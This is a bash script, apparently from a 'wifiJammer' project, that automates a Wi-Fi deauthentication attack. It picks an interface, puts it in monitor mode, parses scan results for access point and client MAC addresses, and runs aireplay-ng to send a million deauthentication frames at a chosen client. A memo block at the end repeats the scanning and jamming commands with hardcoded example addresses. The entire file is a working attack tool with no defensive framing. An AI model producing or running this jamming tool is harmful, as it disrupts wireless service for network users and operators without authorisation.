#!/bin/bash

transparent="\e[0m"
bReverse="\e[7;1m"
title="\e[3;33m"
warning="\033[1;31m"

clear
echo -e $warning"if you don't scan networks before, quit and do it"$transparent

com="n"
ans="n"

intSelected="none"
$networkC
allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1)
while [ $ans != "y" ]
do
	for interface in $allInterface
	do
		echo -e $title" choose the interface :"$transparent
		echo $allInterface
		echo
		echo -e $bReverse""$interface" (y/n)"$transparent
		read ans
		if [ $ans = "y" ]; then
			intSelected=$interface
		fi
		clear
	done
done

if [ $intSelected = "none" ]; then
	echo -e $warning"please next time select an interface"$transparent
	exit
fi


./wifiJammer/src/monitor.sh $intSelected


i=-1
target="none"
bssid=$(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm1 "(?<=<BSSID>)[^<]+")
name=$(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<client-manuf>)[^<]+" | sed "s/ /_/g")


for select in $name
do
	i=$[i+1]
	clear
	echo -e $title"select a target :\n$name $transparent \n\n"
	echo -e $bReverse"---"$select"---"$transparent
	read ans
	if [ $ans = "y" ]; then
		target=$select
		break
	fi

done

if [ $target != "none" ]; then
	tabM=($(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<client-mac>)[^<]+"))
	echo ${tabM[0]}"val1"
	echo ${tabM[1]}"val2"
	echo "--------------------"

	tabC=($(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<channel>)[^<]+" ))

	echo "*********************"

	echo "BBSID : "$bssid
	echo "Mac : "${tabM[i]}
	echo "Channel : "${tabC[$[i+1]]}
	sudo iwconfig $intSelected channel ${tabC[$[i+1]]}
	sudo aireplay-ng -0 1000000 -a $bssid $intSelected -j -c ${tabM[i]}


fi


#memo
if [ $com = "y" ]; then

#scan network
airodump-ng $intSelected
#scan during 5 seconds and write the result in test-01.csv
timeout 4 airodump-ng wlan1 -w test



#scann client
airodump-ng $intSelected --bssid 02:1A:11:FD:D5:21 -c 11
#need to be in the same channel
iwconfig $intSelected channel 11
#jamm the network
aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j
#jamm B8 client from the network
aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j -c B8:27:EB:A4:46:21

fi
